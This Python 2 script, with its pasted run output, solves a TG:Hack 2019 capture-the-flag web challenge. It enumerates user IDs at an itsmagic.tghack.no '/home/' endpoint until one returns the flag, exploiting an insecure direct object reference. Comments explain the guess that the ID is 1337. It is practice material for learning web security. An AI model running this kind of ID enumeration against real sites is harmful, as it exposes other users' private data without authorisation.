import requests, sys
"""
# BruteForce for Answer

srimbp:Desktop sri$ python tgWeb4.py
https://itsmagic.tghack.no/home/1000
https://itsmagic.tghack.no/home/1001
https://itsmagic.tghack.no/home/1002
https://itsmagic.tghack.no/home/1003
...
...
...
https://itsmagic.tghack.no/home/1321
https://itsmagic.tghack.no/home/1322
https://itsmagic.tghack.no/home/1323
https://itsmagic.tghack.no/home/1324
https://itsmagic.tghack.no/home/1325
https://itsmagic.tghack.no/home/1326
https://itsmagic.tghack.no/home/1327
https://itsmagic.tghack.no/home/1328
https://itsmagic.tghack.no/home/1329
https://itsmagic.tghack.no/home/1330
https://itsmagic.tghack.no/home/1331
https://itsmagic.tghack.no/home/1332
https://itsmagic.tghack.no/home/1333
https://itsmagic.tghack.no/home/1334
https://itsmagic.tghack.no/home/1335
https://itsmagic.tghack.no/home/1336
https://itsmagic.tghack.no/home/1337
Congrats, y0ur s0 1337! </br>TG19{Direct object reference might B insecure!}
srimbp:Desktop sri$ 
"""

# Brute Force Method
# * It was requesting for /login/name and /home/userid
#   - login name did not make much sense as it returned the same user id
#   - Used home user id and brute force was a success
# * Actually, its leet speak == 1337 sp34k
#   - handful of all numbers leet speak words and the closest one 1337
url = "https://itsmagic.tghack.no/home/"
i = 1300
while 1:
    print url+str(i)
    response = requests.get(url+str(i))
    if "TG19" in response.text or "tg19" in response.text:
        print response.text
        sys.exit()
    i += 1

